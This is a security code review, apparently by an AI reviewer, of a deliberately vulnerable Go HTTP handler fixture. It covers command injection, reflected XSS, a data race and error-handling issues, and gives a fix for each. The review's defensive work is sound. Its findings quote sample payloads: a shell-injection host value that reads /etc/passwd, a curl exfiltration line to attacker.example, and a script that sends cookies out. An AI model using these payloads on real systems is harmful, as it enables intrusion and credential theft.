# Code Review: counter.go

**File reviewed:** `fixtures/go-handler/counter.go`
**Date:** 2026-04-15
**Reviewer:** Claude (automated review)

---

## Summary

The file implements three HTTP handlers (`/ping`, `/increment`, `/profile`) and a `main` entry-point. It contains two critical security vulnerabilities (command injection and XSS), one concurrency bug, and several code-quality issues. None of the findings are trivial; two are exploitable remotely with no authentication required.

---

## Findings

### FINDING 1 — Command Injection via unsanitised `req.Host`

**Severity:** HIGH
**File:Line:** `counter.go:22`

```go
out, err := exec.Command("sh", "-c", "ping -c 1 "+req.Host).Output()
```

**Evidence:**
The value of `req.Host` is taken directly from a JSON request body and concatenated into a shell command string that is passed to `sh -c`. An attacker can supply a host value such as:

```
"host": "127.0.0.1; cat /etc/passwd"
"host": "$(curl http://attacker.example/exfil?d=$(id))"
```

Because the entire string is handed to `sh -c`, any shell metacharacter the attacker includes is interpreted by the shell. This gives unauthenticated remote code execution on the host.

**Recommended fix:**
- Pass arguments as a slice to `exec.Command`, never via `sh -c` with string concatenation.
- Validate `req.Host` against a strict allowlist (hostname regex, no special characters) before use.
- Consider whether a public endpoint should be permitted to trigger outbound network probes at all.

```go
// Safe: shell is never involved
out, err := exec.Command("ping", "-c", "1", req.Host).Output()
```

Even with the slice form, validate `req.Host` before passing it:

```go
var validHost = regexp.MustCompile(`^[a-zA-Z0-9.\-]+$`)

func pingHandler(w http.ResponseWriter, r *http.Request) {
    body, err := io.ReadAll(r.Body)
    if err != nil {
        http.Error(w, "bad request", http.StatusBadRequest)
        return
    }
    var req PingRequest
    if err := json.Unmarshal(body, &req); err != nil {
        http.Error(w, "bad request", http.StatusBadRequest)
        return
    }
    if !validHost.MatchString(req.Host) || len(req.Host) > 253 {
        http.Error(w, "invalid host", http.StatusBadRequest)
        return
    }
    out, err := exec.Command("ping", "-c", "1", req.Host).Output()
    // ...
}
```

---

### FINDING 2 — Reflected Cross-Site Scripting (XSS) in `profileHandler`

**Severity:** HIGH
**File:Line:** `counter.go:37`

```go
name := r.URL.Query().Get("name")
html := "<html><body>Hello, " + name + "</body></html>"
w.Header().Set("Content-Type", "text/html")
w.Write([]byte(html))
```

**Evidence:**
The `name` query parameter is reflected directly into an HTML response without any escaping or sanitisation. A request such as:

```
GET /profile?name=<script>document.location='http://attacker.example/?c='+document.cookie</script>
```

delivers executable JavaScript to anyone who follows the link. This enables session hijacking, credential theft, and phishing.

**Recommended fix:**
Use `html/template` (Go's contextually-aware escaping package) instead of string concatenation:

```go
import "html/template"

var profileTmpl = template.Must(template.New("profile").Parse(
    `<html><body>Hello, {{.}}</body></html>`,
))

func profileHandler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    if err := profileTmpl.Execute(w, name); err != nil {
        http.Error(w, "internal error", http.StatusInternalServerError)
    }
}
```

---

### FINDING 3 — Data Race on global `counter`

**Severity:** HIGH
**File:Line:** `counter.go:11`, `counter.go:31-32`

```go
var counter int          // line 11

func incrementHandler(...) {
    counter = counter + 1                       // line 31
    w.Write([]byte(strings.Repeat("x", counter))) // line 32
}
```

**Evidence:**
`counter` is a package-level variable mutated by `incrementHandler` without any synchronisation. Go's `net/http` server dispatches each request in its own goroutine. Concurrent reads and writes to an unsynchronised `int` constitute a data race under the Go memory model and produce undefined behaviour — including torn reads, missed increments, and (on 32-bit targets) partial writes.

Running `go test -race` or `go run -race` would immediately flag this.

**Recommended fix:**
Use `sync/atomic` for a lock-free counter, or protect with a `sync.Mutex`:

```go
import "sync/atomic"

var counter int64

func incrementHandler(w http.ResponseWriter, r *http.Request) {
    n := atomic.AddInt64(&counter, 1)
    w.Write([]byte(strings.Repeat("x", int(n))))
}
```

Note that even with atomics, the read on line 32 is now consistent because `atomic.AddInt64` returns the new value directly.

---

### FINDING 4 — Errors from `io.ReadAll` and `json.Unmarshal` silently discarded

**Severity:** MEDIUM
**File:Line:** `counter.go:18-20`

```go
body, _ := io.ReadAll(r.Body)
var req PingRequest
json.Unmarshal(body, &req)
```

**Evidence:**
Both errors are ignored with `_` or no assignment. If the body is malformed or the connection is reset, `req.Host` will be the zero value (empty string), and `exec.Command("sh", "-c", "ping -c 1 ")` will still be executed. Ignoring `json.Unmarshal`'s error also means partial/corrupt JSON silently proceeds.

**Recommended fix:**
Return a `400 Bad Request` on either failure (as shown in the fix for Finding 1).

---

### FINDING 5 — `http.ListenAndServe` error discarded

**Severity:** MEDIUM
**File:Line:** `counter.go:46`

```go
http.ListenAndServe(":8080", nil)
```

**Evidence:**
`ListenAndServe` only returns when it encounters a fatal error (e.g., address already in use, permission denied). Ignoring the return value means the process silently exits with no diagnostic output.

**Recommended fix:**

```go
if err := http.ListenAndServe(":8080", nil); err != nil {
    log.Fatalf("server stopped: %v", err)
}
```

---

### FINDING 6 — `w.Write` return values ignored

**Severity:** LOW
**File:Line:** `counter.go:27`, `counter.go:32`, `counter.go:39`

```go
w.Write(out)
w.Write([]byte(strings.Repeat("x", counter)))
w.Write([]byte(html))
```

**Evidence:**
`http.ResponseWriter.Write` returns `(int, error)`. While the Go HTTP stack will typically log transport errors internally, ignoring write errors prevents the handler from reacting (e.g., breaking out of a loop, logging for observability). This is a minor quality issue but violates the Go convention of handling all errors.

**Recommended fix:**
At minimum log write errors:

```go
if _, err := w.Write(out); err != nil {
    log.Printf("write error: %v", err)
}
```

---

### FINDING 7 — `incrementHandler` does not validate HTTP method

**Severity:** LOW
**File:Line:** `counter.go:30-33`

```go
func incrementHandler(w http.ResponseWriter, r *http.Request) {
    counter = counter + 1
    w.Write([]byte(strings.Repeat("x", counter)))
}
```

**Evidence:**
A `GET` or `HEAD` request to `/increment` is a side-effecting operation, violating HTTP semantics (GET must be safe and idempotent). Browser prefetch, crawlers, and monitoring probes can unintentionally increment the counter.

**Recommended fix:**
Guard with a method check:

```go
if r.Method != http.MethodPost {
    http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
    return
}
```

---

### FINDING 8 — Memory amplification via `strings.Repeat`

**Severity:** LOW
**File:Line:** `counter.go:32`

```go
w.Write([]byte(strings.Repeat("x", counter)))
```

**Evidence:**
`counter` is an unbounded integer. After enough increments the response body grows without limit, allocating arbitrarily large byte slices per request. This can be used as a denial-of-service vector once the counter is large.

**Recommended fix:**
Cap the counter at a reasonable maximum, or change the response to return the numeric value rather than a variable-length string:

```go
w.Write([]byte(strconv.FormatInt(n, 10)))
```

---

## Finding Count by Severity

| Severity | Count |
|----------|-------|
| HIGH     | 3     |
| MEDIUM   | 2     |
| LOW      | 3     |
| **Total**| **8** |

---

## Prioritised Remediation Order

1. **Fix command injection (Finding 1)** — remote code execution, must ship immediately.
2. **Fix XSS (Finding 2)** — exploitable with a single link, trivial to fix with `html/template`.
3. **Fix race condition (Finding 3)** — undefined behaviour under any load; use `sync/atomic`.
4. **Handle errors from `io.ReadAll` / `json.Unmarshal` (Finding 4)** — prevents silent misuse of zero-value fields.
5. **Handle `ListenAndServe` error (Finding 5)** — operational reliability.
6. **Remaining LOW findings** — address in the same patch for completeness.
